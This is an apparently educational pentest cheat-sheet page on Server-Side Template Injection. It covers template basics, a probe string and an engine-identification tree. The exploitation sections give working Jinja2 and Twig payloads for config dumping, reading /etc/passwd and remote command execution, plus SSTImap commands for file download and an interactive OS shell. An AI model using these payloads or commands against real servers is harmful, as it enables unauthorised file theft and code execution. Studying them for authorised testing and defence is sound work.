---
layout: default
title: SSTI
permalink: /Web/ssti/
---

# Server-Side Template Injection (SSTI)
A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses.
This generation is often based on user input, enabling the web application to respond to user input dynamically.
When an attacker can inject template code that is later rendered by the server, a Server-Side Template Injection vulnerability can occur.
Popular examples of template engines are Jinja and Twig.
## Templating
### Jinja2
Example:
{% raw %}
```
Hello {{ name }}!
```
{% rawend %}
It contains a single variable called `name`, which is replaced with a dynamic value during rendering.
For-loop over all elements in the `names` variable (if is like `names=["name", "name2", "name3"]`):
{% raw %}
```
{% for name in names %}
Hello {{ name }}!
{% endfor %}
```
{% rawend %}
## Confirming SSTI
The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior.
Example:
{% raw %}
```
${{<%[%'"}}%\.
```
{% rawend %}
## Identifying the Template Engine
We can utilize slight variations in the behavior of different template engines. We can use this decision tree by following the green sign in case of successful code execution and the red cross in case of the payload wasn't executed:
{% raw %}
```
${7*7}
├── ✅ a{*comment*}b
│   ├── ✅ Smarty
│   └── ❌ ${"z".join("ab")}
│       ├── ✅ Mako
│       └── ❌ Unknown
└── ❌ {{7*7}}
    ├── ✅ {{7*'7'}}
    │       ├── ✅  Jinja2
    │       ├── ✅  Twig
    │       └── ❌ Unknown
    └── ❌ Not vulnerable
```
{% endraw %}
*Note: There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).
## Exploiting SSTI in Jinja2
{% raw %}
### Information Disclosure
Payload to dump the entire web application configuration:
```
{{ config.items() }}
```
Payload to dump all available built-in functions:
```
{{ self.__init__.__globals__.__builtins__ }}
```
### Local File Inclusion (LFI)
```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
### Remote Code Execution (RCE)
We can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
## Exploiting SSTI in Twig
### Information Disclosure
Payload to get information about the current template:
```
{{ _self }}
```
### Local File Inclusion (LFI)
The PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:
```
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
### Remote Code Execution (RCE)
```
{{ ['id'] | filter('system') }}
```
{% rawend %}
## Tools of the Trade
Popular tools for identifying and exploiting SSTI vulnerabilities are [tplmap](https://github.com/epinna/tplmap) and [SSTImap](https://github.com/vladko312/SSTImap).
### SSTImap
```
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
```
To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:
```
python3 sstimap.py -u http://$ip/index.php?name=test
```
We can download a remote file to our local machine using the `-D` flag:
```
python3 sstimap.py -u http://$ip/index.php?name=test -D '/etc/passwd' './passwd'
```
We can execute a system command using the -S flag:
```
python3 sstimap.py -u http://$ip/index.php?name=test -S id
```
Alternatively, we can use --os-shell to obtain an interactive shell:
```
python3 sstimap.py -u http://$ip/index.php?name=test --os-shell
```
